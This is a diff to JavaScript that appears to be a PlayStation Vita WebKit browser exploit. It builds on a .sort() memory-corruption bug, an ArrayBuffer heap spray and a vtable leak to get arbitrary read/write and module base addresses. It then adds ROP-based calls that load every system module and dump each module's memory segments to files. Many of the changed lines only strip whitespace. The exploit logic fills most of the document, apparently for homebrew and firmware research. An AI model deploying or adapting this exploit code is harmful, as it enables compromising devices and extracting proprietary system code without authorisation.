@@ -22,7 +22,7 @@ function initMemoryHole()
 
         offsets = ver_offsets[version];
 
-        /* 
+        /*
            .sort() vuln c/p
 -------------------------------------------------------------------------------
         */
@@ -110,9 +110,9 @@ function initMemoryHole()
 -------------------------------------------------------------------------------
          */
 
-        /* 
+        /*
            Spray memory with ArrayBuffers that will be used to get
-           arbitrary read/write 
+           arbitrary read/write
         */
         var spraysiz = 0x1000
         logdbg("Spraying ArrayBuffers...");
@@ -249,10 +249,10 @@ function initMemoryHole()
         /*
             Get SceWebkit base
         */
-        var vtab = aspace32[(u32addr / 4)];                                 // vtable of u32 
-        var leakedptr = aspace32[(vtab + 0x48) / 4];                        // leak a pointer in .text of SceWebkit 
+        var vtab = aspace32[(u32addr / 4)];                                 // vtable of u32
+        var leakedptr = aspace32[(vtab + 0x48) / 4];                        // leak a pointer in .text of SceWebkit
         var scewkbase = leakedptr - offsets.scewkbase_off;                  // base address of SceWebkit module
- 
+
         /*
             Get SceLibc base
         */
@@ -300,8 +300,8 @@ function initMemoryHole()
             Initialize ROP gadgets and library functions
         */
         bases = {
-                    "SceWebkit": scewkbase, 
-                    "SceLibKernel": scekernbase, 
+                    "SceWebkit": scewkbase,
+                    "SceLibKernel": scekernbase,
                     "SceNet": scenetbase,
                     "SceLibc": scelibcbase
                 };
@@ -311,6 +311,10 @@ function initMemoryHole()
         libraries = init_ggts(bases, caller, version);
 
         var syscall_a = scekernbase + 0x5B2C;
+
+
+
+
 
         var sceKernelGetModuleList = sceKernelGetModuleList_caller(caller(syscall_a+16,libraries));
         var sceKernelGetModuleInfo = sceKernelGetModuleInfo_caller(caller(syscall_a+32,libraries));
@@ -327,8 +331,61 @@ function initMemoryHole()
         var mod_list_a = res[1];
         var num_loaded_a = res[2];
         var num_loaded = aspace32[num_loaded_a/4];
-        logdbg("Loaded Module UIDs: ");
-        do_read(aspace,mod_list_a,num_loaded * 4);
+        logdbg("Loaded Modules count: " + num_loaded);
+        //do_read(aspace,mod_list_a,num_loaded * 4);
+        var segments = [];
+        var SceWebKitProcessBase = 0x0;
+        for(i=0;i<num_loaded*4;i+=4){
+            var this_r = sceKernelGetModuleInfo(aspace32[(mod_list_a+i)/4])
+            if (this_r[0] != 0){
+                logdbg("Failed to load module info "+i/4);
+                continue;
+            }
+            var this_mod_info_a = this_r[1];
+            var this_segment_info_a = this_mod_info_a+0x154;
+            var this_mod_name_a = this_mod_info_a+12;
+
+            var this_mod_name = readNullTermString(aspace,this_mod_name_a);
+            for (j=0; j<=4; j++){
+                var this_seg_addr = this_segment_info_a + j*0x18;
+
+
+                if (aspace32[(this_seg_addr)/4] != 0x18){
+                    continue;
+                }
+                var this_vaddr = aspace32[(this_seg_addr+8)/4];
+
+                if (this_mod_name == "SceWebKitProcess"){SceWebKitProcessBase = this_vaddr; break;}
+
+
+
+
+            }
+        }
+        var sceSysmoduleLoadModule = sceSysmoduleLoadModule_caller(caller(SceWebKitProcessBase+0x124F8, libraries));
+
+//load all available libs
+        for(i=1;i<0x100;i++)
+        {
+            res = sceSysmoduleLoadModule(i);
+            //if(res != 0)
+                //logdbg("load module " + i.toString() + " failed: 0x" + res.toString(16));
+        }
+
+         res = sceKernelGetModuleList();
+
+
+
+        if (res[0] != 0x0){
+            logdbg("Error! Failed to get module list");
+            return aspace
+        }
+
+         mod_list_a = res[1];
+         num_loaded_a = res[2];
+        num_loaded = aspace32[num_loaded_a/4];
+        logdbg("Loaded Modules count: " + num_loaded);
+
 
         for(i=0;i<num_loaded*4;i+=4){
             var result = sceKernelGetModuleInfo(aspace32[(mod_list_a+i)/4])
@@ -344,28 +401,38 @@ function initMemoryHole()
             var mod_name_a = mod_info_a+12;
 
             var mod_name = readNullTermString(aspace,mod_name_a);
+
             logdbg("Module Name: " +  mod_name);
             for (j=0; j<=4; j++){
                 var seg_addr = segment_info_a + j*0x18;
 
 
                 if (aspace32[(seg_addr)/4] != 0x18){
-                    break;
+                    continue;
                 }
-                logdbg("Segment Info: " + j);
+                //logdbg("Segment Info: " + j);
                 var vaddr = aspace32[(seg_addr+8)/4];
                 var memsz = aspace32[(seg_addr+12)/4];
-                logdbg("vaddr: 0x" + vaddr.toString(16));
-                logdbg("memsz: 0x" + memsz.toString(16));
+                //logdbg("vaddr: 0x" + vaddr.toString(16));
+                //logdbg("memsz: 0x" + memsz.toString(16));
+                segments.push([vaddr,memsz,mod_name]);
                 do_dump(aspace,vaddr,memsz,mod_name + ".seg"+ j.toString()+ ".bin");
-
             }
-
-
-
         }
+        logdbg("Added all segments");
 
 
+
+        /*
+        do_dis(aspace,SceDriverUserBase+0x3739,16,0x0);
+        logdbg("-----");
+        do_dis(aspace,SceDriverUserBase+0x3739+1,16,0x0);
+        logdbg("-----");
+        do_dis(aspace,SceDriverUserBase+0x3739+2,16,0x0);
+        logdbg("-----");
+        do_dis(aspace,SceDriverUserBase+0x3739+3,16,0x0);
+        logdbg("-----");
+         */
 
 
         /*
